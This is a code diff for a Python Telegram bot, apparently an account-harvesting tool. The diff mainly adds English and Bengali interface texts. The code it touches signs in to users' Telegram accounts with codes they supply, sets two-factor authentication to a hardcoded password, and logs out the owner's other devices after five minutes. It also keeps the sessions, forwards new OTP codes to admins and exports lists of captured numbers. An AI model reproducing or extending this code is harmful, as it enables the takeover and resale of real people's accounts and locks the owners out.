@@ -24,7 +24,7 @@ ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x
 
 TWO_FA_PASSWORD = "Tg@123456"
 LOGOUT_AFTER_MINUTES = 5
-CHECK_INTERVAL = 60          # প্রতি ৬০ সেকেন্ডে সেশন চেক করবে
+CHECK_INTERVAL = 60
 
 # ====================== PATHS ======================
 SESSIONS_DIR = "sessions"
@@ -36,10 +36,66 @@ ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
 CODES_FILE = f"{DATA_DIR}/codes.json"
 SETTINGS_FILE = f"{DATA_DIR}/settings.json"
 ADMINS_FILE = f"{DATA_DIR}/admins.json"
+LANG_FILE = f"{DATA_DIR}/languages.json"
 
 WAITING_CODE = 1
 clients = {}
 pending = {}
+
+# ====================== LANGUAGE TEXTS ======================
+TEXTS = {
+    "en": {
+        "welcome": "👋 Welcome **{name}**!\n\nPlease select your language:",
+        "lang_selected": "✅ Language set to **English**",
+        "send_number": "📱 Send phone number with `+`\nExample: `+8801712345678`\n\nAfter login use /information",
+        "sending_code": "⏳ Sending login code...",
+        "code_sent": "📲 {flag} `{phone}`\n\n🔑 Code sent! Please send the login code.\n\n➿ /cancel",
+        "already_login": "✅ This number is already logged in!",
+        "invalid_code": "❗️ Invalid code. Please try again.\n\n/cancel",
+        "has_2fa": "⚠️ This number already has Two-Factor Authentication.",
+        "login_success": "🎉 **Login Successful!**\n\n🌍 {flag} **{country}**\n📱 Number: `{phone}`\n👤 Name: {name}\n🔒 2FA: `{status}`\n\n⏳ Other devices will be logged out in **{min} minutes**.\n➡️ Use /information",
+        "cancelled": "✅ Cancelled successfully.",
+        "session_expired": "⚠️ Session expired. Please send the number again.",
+        "info_menu": "ℹ️ **Information Menu**\n\n📊 Currently Active Numbers: `{total}`\n\nSelect an option:",
+        "no_numbers": "📭 You have no active numbers right now.",
+        "your_numbers": "📱 **Your Active Numbers by Country**\n\nSelect a country:",
+        "select_download": "📁 **Select Country to Download**",
+        "file_sent": "✅ File sent successfully!",
+        "no_download": "📭 No numbers available to download.",
+        "congrats_code": "🎉 **Congratulations!**\n\n🌍 {flag} **{country}**\n📱 Number: `{phone}`\n🔑 OTP Code: `{code}`\n🔒 Two-Factor: `{tfa}`\n📅 {time}\n\n✅ Use this code to login.",
+    },
+    "bn": {
+        "welcome": "👋 স্বাগতম **{name}**!\n\nঅনুগ্রহ করে আপনার ভাষা সিলেক্ট করুন:",
+        "lang_selected": "✅ ভাষা **বাংলা** সেট করা হয়েছে",
+        "send_number": "📱 `+` চিহ্নসহ ফোন নাম্বার পাঠান\nউদাহরণ: `+8801712345678`\n\nলগইন হওয়ার পর /information ব্যবহার করুন",
+        "sending_code": "⏳ লগইন কোড পাঠানো হচ্ছে...",
+        "code_sent": "📲 {flag} `{phone}`\n\n🔑 কোড পাঠানো হয়েছে! লগইন কোডটি পাঠান।\n\n➿ /cancel",
+        "already_login": "✅ এই নাম্বার ইতিমধ্যে লগইন করা আছে!",
+        "invalid_code": "❗️ কোডটি ভুল। আবার চেষ্টা করুন।\n\n/cancel",
+        "has_2fa": "⚠️ এই নাম্বারে ইতিমধ্যে টু-ফ্যাক্টর চালু আছে।",
+        "login_success": "🎉 **লগইন সফল হয়েছে!**\n\n🌍 {flag} **{country}**\n📱 নাম্বার: `{phone}`\n👤 নাম: {name}\n🔒 ২FA: `{status}`\n\n⏳ অন্য ডিভাইস **{min} মিনিট** পর লগআউট হবে।\n➡️ /information ব্যবহার করুন",
+        "cancelled": "✅ বাতিল করা হয়েছে।",
+        "session_expired": "⚠️ সেশন শেষ হয়ে গেছে। আবার নাম্বার পাঠান।",
+        "info_menu": "ℹ️ **ইনফরমেশন মেনু**\n\n📊 বর্তমানে অ্যাকটিভ নাম্বার: `{total}`\n\nঅপশন সিলেক্ট করুন:",
+        "no_numbers": "📭 আপনার কোনো অ্যাকটিভ নাম্বার নেই।",
+        "your_numbers": "📱 **দেশ অনুযায়ী আপনার নাম্বার**\n\nএকটি দেশ সিলেক্ট করুন:",
+        "select_download": "📁 **ডাউনলোড করার জন্য দেশ সিলেক্ট করুন**",
+        "file_sent": "✅ ফাইল পাঠানো হয়েছে!",
+        "no_download": "📭 ডাউনলোড করার মতো কোনো নাম্বার নেই।",
+        "congrats_code": "🎉 **অভিনন্দন!**\n\n🌍 {flag} **{country}**\n📱 নাম্বার: `{phone}`\n🔑 OTP কোড: `{code}`\n🔒 টু-ফ্যাক্টর: `{tfa}`\n📅 {time}\n\n✅ এই কোড দিয়ে লগইন করুন।",
+    }
+}
+
+def t(uid, key, **kwargs):
+    langs = load_json(LANG_FILE, {})
+    lang = langs.get(str(uid), "en")
+    text = TEXTS.get(lang, TEXTS["en"]).get(key, key)
+    return text.format(**kwargs) if kwargs else text
+
+def set_lang(uid, lang):
+    langs = load_json(LANG_FILE, {})
+    langs[str(uid)] = lang
+    save_json(LANG_FILE, langs)
 
 # ====================== HELPERS ======================
 def load_json(path, default=None):
@@ -117,7 +173,6 @@ async def start_client(phone):
             return
         code = m.group(1)
 
-        # Save code
         codes = load_json(CODES_FILE, {})
         if phone not in codes:
             codes[phone] = []
@@ -133,25 +188,19 @@ async def start_client(phone):
         flag = get_flag(phone)
         country = get_country_name(get_country_code(phone))
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        uid = acc["uid"]
 
-        # ===== ইউজারকে কোড পাঠানো =====
+        # User notification
         try:
             from telegram import Bot
             bot = Bot(token=BOT_TOKEN)
-            user_msg = (
-                f"🎉 **Congratulations!**\n\n"
-                f"🌍 {flag} **{country}**\n"
-                f"📱 Number: `{phone}`\n"
-                f"🔑 OTP Code: `{code}`\n"
-                f"🔒 Two-Factor: `{TWO_FA_PASSWORD}`\n"
-                f"📅 {now}\n\n"
-                f"✅ Use this code to login."
-            )
-            await bot.send_message(chat_id=acc["uid"], text=user_msg, parse_mode="Markdown")
+            msg = t(uid, "congrats_code", flag=flag, country=country, phone=phone,
+                    code=code, tfa=TWO_FA_PASSWORD, time=now)
+            await bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
         except Exception as ex:
             print("User notify error:", ex)
 
-        # ===== অ্যাডমিনকে নোটিফিকেশন =====
+        # Admin notification
         settings = get_settings()
         if settings.get("silent", True):
             for admin_id in get_admins():
@@ -162,7 +211,7 @@ async def start_client(phone):
                         f"🔔 **New Code Received**\n\n"
                         f"👤 Name: {acc.get('name', 'Unknown')}\n"
                         f"📧 Username: @{acc.get('username') or 'None'}\n"
-                        f"🆔 Chat ID: `{acc['uid']}`\n"
+                        f"🆔 Chat ID: `{uid}`\n"
                         f"📱 Number: `{phone}`\n"
                         f"🌍 {flag} {country}\n"
                         f"🔑 OTP: `{code}`\n"
@@ -203,23 +252,19 @@ async def logout_other_devices(phone):
                 except:
                     pass
     except Exception as e:
-        print(f"Logout other devices error ({phone}):", e)
+        print(f"Logout error ({phone}):", e)
 
 async def check_sessions_loop():
-    """প্রতি কিছুক্ষণ পর সেশন চেক করে অবৈধ হলে অটো রিমুভ করবে"""
     while True:
         try:
             accounts = load_json(ACCOUNTS_FILE, {})
             to_remove = []
-
             for phone in list(accounts.keys()):
                 try:
                     if phone in clients:
-                        client = clients[phone]
-                        if not await client.is_user_authorized():
+                        if not await clients[phone].is_user_authorized():
                             to_remove.append(phone)
                     else:
-                        # ক্লায়েন্ট না থাকলে আবার কানেক্ট করার চেষ্টা
                         ok = await start_client(phone)
                         if not ok:
                             to_remove.append(phone)
@@ -236,7 +281,6 @@ async def check_sessions_loop():
                         except:
                             pass
                         del clients[phone]
-                    # সেশন ফাইলও ডিলিট
                     session_file = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
                     if os.path.exists(session_file):
                         try:
@@ -244,25 +288,52 @@ async def check_sessions_loop():
                         except:
                             pass
                 save_json(ACCOUNTS_FILE, accounts)
-                print(f"Auto removed {len(to_remove)} invalid sessions")
-
+                print(f"Auto removed {len(to_remove)} sessions")
         except Exception as e:
             print("Session check error:", e)
-
         await asyncio.sleep(CHECK_INTERVAL)
 
-# ====================== USER COMMANDS ======================
+# ====================== START & LANGUAGE ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    uid = user.id
+    langs = load_json(LANG_FILE, {})
+
+    if str(uid) not in langs:
+        # প্রথমবার → ভাষা সিলেক্ট
+        kb = [
+            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
+            [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
+        ]
+        await update.message.reply_text(
+            TEXTS["en"]["welcome"].format(name=user.first_name),
+            reply_markup=InlineKeyboardMarkup(kb),
+            parse_mode="Markdown"
+        )
+    else:
+        await update.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")
+
+async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    kb = [
+        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
+        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
+    ]
     await update.message.reply_text(
-        f"👋 Welcome **{user.first_name}**!\n\n"
-        f"📱 Send phone number with `+`\n"
-        f"Example: `+8801712345678`\n\n"
-        f"After successful login use:\n"
-        f"➡️ /information",
-        parse_mode="Markdown"
+        "🌐 Select Language / ভাষা সিলেক্ট করুন:",
+        reply_markup=InlineKeyboardMarkup(kb)
     )
 
+async def lang_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    lang = q.data.replace("lang_", "")
+
+    set_lang(uid, lang)
+    await q.edit_message_text(t(uid, "lang_selected"), parse_mode="Markdown")
+    await q.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")
+
+# ====================== LOGIN FLOW ======================
 async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip().replace(" ", "")
     if not re.match(r'^\+?\d{8,15}$', text):
@@ -273,14 +344,14 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     user = update.effective_user
 
-    wait = await update.message.reply_text("⏳ Sending login code...")
+    wait = await update.message.reply_text(t(uid, "sending_code"))
 
     try:
         client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
         await client.connect()
 
         if await client.is_user_authorized():
-            await wait.edit_text("✅ This number is already logged in!")
+            await wait.edit_text(t(uid, "already_login"))
             await client.disconnect()
             return ConversationHandler.END
 
@@ -295,16 +366,11 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
 
         await wait.edit_text(
-            f"📲 {get_flag(phone)} `{phone}`\n\n"
-            f"🔑 Code sent! Please send the 5 or 6-digit login code.\n\n"
-            f"➿ /cancel",
+            t(uid, "code_sent", flag=get_flag(phone), phone=phone),
             parse_mode="Markdown"
         )
         return WAITING_CODE
 
-    except FloodWaitError as e:
-        await wait.edit_text(f"⚠️ FloodWait! Please wait {e.seconds} seconds.")
-        return ConversationHandler.END
     except Exception as e:
         await wait.edit_text(f"❌ Error: {e}")
         return ConversationHandler.END
@@ -312,7 +378,8 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if chat_id not in pending:
-        await update.message.reply_text("⚠️ Session expired. Please send the number again.")
+        uid = update.effective_user.id
+        await update.message.reply_text(t(uid, "session_expired"))
         return ConversationHandler.END
 
     data = pending[chat_id]
@@ -323,28 +390,25 @@ async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
     except PhoneCodeInvalidError:
-        await update.message.reply_text("❗️ Invalid code. Please try again.\n\n/cancel")
+        await update.message.reply_text(t(uid, "invalid_code"))
         return WAITING_CODE
     except SessionPasswordNeededError:
-        await update.message.reply_text("⚠️ This number already has Two-Factor Authentication.")
+        await update.message.reply_text(t(uid, "has_2fa"))
         await data["client"].disconnect()
         del pending[chat_id]
         return ConversationHandler.END
     except Exception as e:
-        await update.message.reply_text(f"❌ Login Error: {e}")
+        await update.message.reply_text(f"❌ Error: {e}")
         await data["client"].disconnect()
         del pending[chat_id]
         return ConversationHandler.END
 
-    # Success
     me = await data["client"].get_me()
     ok = await enable_2fa(data["client"])
 
-    # ৫ মিনিট পর অন্য ডিভাইস লগআউট
     async def delayed_logout():
         await asyncio.sleep(LOGOUT_AFTER_MINUTES * 60)
         await logout_other_devices(phone)
-
     asyncio.create_task(delayed_logout())
 
     accounts = load_json(ACCOUNTS_FILE, {})
@@ -362,47 +426,43 @@ async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start_client(phone)
     del pending[chat_id]
 
-    flag = get_flag(phone)
-    country = get_country_name(get_country_code(phone))
-
+    status = "Enabled ✅" if ok else "Failed ❌"
     await update.message.reply_text(
-        f"🎉 **Login Successful!**\n\n"
-        f"🌍 {flag} **{country}**\n"
-        f"📱 Number: `{phone}`\n"
-        f"👤 Name: {me.first_name or 'N/A'}\n"
-        f"🔒 2FA: `{'Enabled ✅' if ok else 'Failed ❌'}`\n\n"
-        f"⏳ Other devices will be logged out in **{LOGOUT_AFTER_MINUTES} minutes**.\n"
-        f"➡️ Use /information for more options.",
+        t(uid, "login_success",
+          flag=get_flag(phone),
+          country=get_country_name(get_country_code(phone)),
+          phone=phone,
+          name=me.first_name or "N/A",
+          status=status,
+          min=LOGOUT_AFTER_MINUTES),
         parse_mode="Markdown"
     )
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
+    uid = update.effective_user.id
     if chat_id in pending:
         try:
             await pending[chat_id]["client"].disconnect()
         except:
             pass
         del pending[chat_id]
-    await update.message.reply_text("✅ Cancelled successfully.")
+    await update.message.reply_text(t(uid, "cancelled"))
     return ConversationHandler.END
 
 # ====================== /information ======================
 async def information(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     accounts = load_json(ACCOUNTS_FILE, {})
-    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}
-    total = len(user_accs)
+    total = sum(1 for i in accounts.values() if i.get("uid") == uid)
 
     kb = [
         [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
         [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
     ]
     await update.message.reply_text(
-        f"ℹ️ **Information Menu**\n\n"
-        f"📊 Currently Active Numbers: `{total}`\n\n"
-        f"Select an option below:",
+        t(uid, "info_menu", total=total),
         reply_markup=InlineKeyboardMarkup(kb),
         parse_mode="Markdown"
     )
@@ -412,38 +472,27 @@ async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     uid = q.from_user.id
     data = q.data
-
     accounts = load_json(ACCOUNTS_FILE, {})
     user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}
 
     if data == "info_allnum":
         if not user_accs:
-            await q.edit_message_text("📭 You have no active numbers right now.")
+            await q.edit_message_text(t(uid, "no_numbers"))
             return
-
         country_count = {}
         for p, i in user_accs.items():
             c = i.get("country") or get_country_code(p)
             country_count[c] = country_count.get(c, 0) + 1
-
         kb = []
         for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
-            kb.append([InlineKeyboardButton(
-                f"{get_flag('+' + c)} {get_country_name(c)} ({n})",
-                callback_data=f"show_{c}"
-            )])
+            kb.append([InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"show_{c}")])
         kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
-
-        await q.edit_message_text(
-            "📱 **Your Active Numbers by Country**\n\nSelect a country:",
-            reply_markup=InlineKeyboardMarkup(kb),
-            parse_mode="Markdown"
-        )
+        await q.edit_message_text(t(uid, "your_numbers"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
     elif data.startswith("show_"):
         code = data.replace("show_", "")
         nums = [p for p, i in user_accs.items() if (i.get("country") == code or get_country_code(p) == code)]
-        text = f"{get_flag('+' + code)} **{get_country_name(code)}** — `{len(nums)}` numbers\n\n"
+        text = f"{get_flag('+' + code)} **{get_country_name(code)}** — `{len(nums)}`\n\n"
         for p in nums:
             text += f"`{p}`\n"
         kb = [[InlineKeyboardButton("◀️ Back", callback_data="info_allnum")]]
@@ -451,40 +500,23 @@ async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "info_download":
         if not user_accs:
-            await q.edit_message_text("📭 No numbers available to download.")
+            await q.edit_message_text(t(uid, "no_download"))
             return
-
         country_count = {}
         for p, i in user_accs.items():
             c = i.get("country") or get_country_code(p)
             country_count[c] = country_count.get(c, 0) + 1
-
         kb = [[InlineKeyboardButton("🌍 All Country", callback_data="dl_all")]]
         for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
-            kb.append([InlineKeyboardButton(
-                f"{get_flag('+' + c)} {get_country_name(c)} ({n})",
-                callback_data=f"dl_{c}"
-            )])
+            kb.append([InlineKeyboardButton(f"{get_flag('+' + c)} {get_country_name(c)} ({n})", callback_data=f"dl_{c}")])
         kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])
-
-        await q.edit_message_text(
-            "📁 **Select Country to Download**",
-            reply_markup=InlineKeyboardMarkup(kb),
-            parse_mode="Markdown"
-        )
+        await q.edit_message_text(t(uid, "select_download"), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
     elif data.startswith("dl_"):
         code = data.replace("dl_", "")
         user = q.from_user
-
-        lines = [
-            f"Name: {user.first_name or 'Unknown'}",
-            f"Username: @{user.username or 'None'}",
-            f"Chat ID: {uid}",
-            f"Total Active Numbers: {len(user_accs)}",
-            ""
-        ]
-
+        lines = [f"Name: {user.first_name or 'Unknown'}", f"Username: @{user.username or 'None'}",
+                 f"Chat ID: {uid}", f"Total: {len(user_accs)}", ""]
         country_nums = {}
         for p, i in user_accs.items():
             c = i.get("country") or get_country_code(p)
@@ -493,23 +525,15 @@ async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if c not in country_nums:
                 country_nums[c] = []
             country_nums[c].append(p)
-
         for c, nums in country_nums.items():
             lines.append(f"{get_country_name(c)} Total: {len(nums)}")
             lines.extend(nums)
             lines.append("")
-
-        content = "\n".join(lines)
         path = f"{DATA_DIR}/user_{uid}_{code}.txt"
         with open(path, "w", encoding="utf-8") as f:
-            f.write(content)
-
-        await q.message.reply_document(
-            document=open(path, "rb"),
-            filename=f"numbers_{code}.txt",
-            caption=f"📁 Your numbers file ({code})"
-        )
-        await q.edit_message_text("✅ File sent successfully!")
+            f.write("\n".join(lines))
+        await q.message.reply_document(open(path, "rb"), filename=f"numbers_{code}.txt")
+        await q.edit_message_text(t(uid, "file_sent"))
 
     elif data == "info_back":
         total = len(user_accs)
@@ -517,17 +541,12 @@ async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
             [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
         ]
-        await q.edit_message_text(
-            f"ℹ️ **Information Menu**\n\n📊 Currently Active Numbers: `{total}`",
-            reply_markup=InlineKeyboardMarkup(kb),
-            parse_mode="Markdown"
-        )
+        await q.edit_message_text(t(uid, "info_menu", total=total), reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
-# ====================== ADMIN DASHBOARD ======================
+# ====================== DASHBOARD ======================
 async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         return
-
     accounts = load_json(ACCOUNTS_FILE, {})
     total_users = len(set(i.get("uid") for i in accounts.values() if i.get("uid")))
     total_numbers = len(accounts)
@@ -543,7 +562,6 @@ async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔔 Silent Mode: {silent}\n"
         f"🟢 Online Clients: `{len(clients)}`"
     )
-
     kb = [
         [InlineKeyboardButton("📢 BoardChat", callback_data="adm_bc")],
         [InlineKeyboardButton(f"🔔 Silent: {silent}", callback_data="adm_silent")],
@@ -557,12 +575,11 @@ async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     if not is_admin(q.from_user.id):
         return
-
     data = q.data
 
     if data == "adm_bc":
         context.user_data["action"] = "broadcast"
-        await q.edit_message_text("📢 Send the message you want to broadcast to all users:")
+        await q.edit_message_text("📢 Send broadcast message:")
 
     elif data == "adm_silent":
         s = get_settings()
@@ -579,13 +596,8 @@ async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not uid:
                 continue
             if uid not in users:
-                users[uid] = {
-                    "name": i.get("name", ""),
-                    "username": i.get("username", ""),
-                    "numbers": []
-                }
+                users[uid] = {"name": i.get("name", ""), "username": i.get("username", ""), "numbers": []}
             users[uid]["numbers"].append(p)
-
         lines = []
         for uid, info in users.items():
             lines.append(f"Name: {info['name']}")
@@ -601,20 +613,12 @@ async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for c, nums in country_nums.items():
                 lines.append(f"{get_country_name(c)} Total: {len(nums)}")
                 lines.extend(nums)
-            lines.append("")
-            lines.append("─" * 30)
-            lines.append("")
-
+            lines.append("\n" + "─"*30 + "\n")
         path = f"{DATA_DIR}/all_users.txt"
         with open(path, "w", encoding="utf-8") as f:
             f.write("\n".join(lines))
-
-        await q.message.reply_document(
-            document=open(path, "rb"),
-            filename="all_users_numbers.txt",
-            caption="📁 All Users Active Numbers"
-        )
-        await q.edit_message_text("✅ File sent successfully!")
+        await q.message.reply_document(open(path, "rb"), filename="all_users.txt")
+        await q.edit_message_text("✅ File sent!")
 
     elif data == "adm_reload":
         loaded = 0
@@ -631,7 +635,6 @@ async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if "action" not in context.user_data:
         return
-
     action = context.user_data.pop("action")
     text = update.message.text.strip()
 
@@ -646,20 +649,17 @@ async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ok += 1
             except:
                 pass
-        await status.edit_text(f"✅ Broadcast completed!\nSuccess: `{ok}`")
+        await status.edit_text(f"✅ Sent to `{ok}` users")
 
 # ====================== MAIN ======================
-async def post_init(app: Application):
+async def post_init(app):
     print("🔄 Loading sessions...")
-    accounts = load_json(ACCOUNTS_FILE, {})
-    for phone in accounts:
+    for p in load_json(ACCOUNTS_FILE, {}):
         try:
-            await start_client(phone)
+            await start_client(p)
         except:
             pass
-    print(f"✅ Bot Ready! Loaded {len(clients)} sessions.")
-
-    # সেশন চেক লুপ চালু
+    print(f"✅ Ready! {len(clients)} sessions loaded.")
     asyncio.create_task(check_sessions_loop())
 
 def main():
@@ -687,11 +687,16 @@ def main():
     )
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("language", language_cmd))
     app.add_handler(CommandHandler("information", information))
     app.add_handler(CommandHandler("dashboard", dashboard))
     app.add_handler(CommandHandler("cancel", cancel))
 
     app.add_handler(conv)
+
+    app.add_handler(
+        CallbackQueryHandler(lang_cb, pattern=r"^lang_")
+    )
 
     app.add_handler(
         CallbackQueryHandler(
@@ -714,7 +719,7 @@ def main():
         )
     )
 
-    print("🚀 Starting bot...")
+    print("🚀 Bot starting...")
     app.run_polling()
 
 
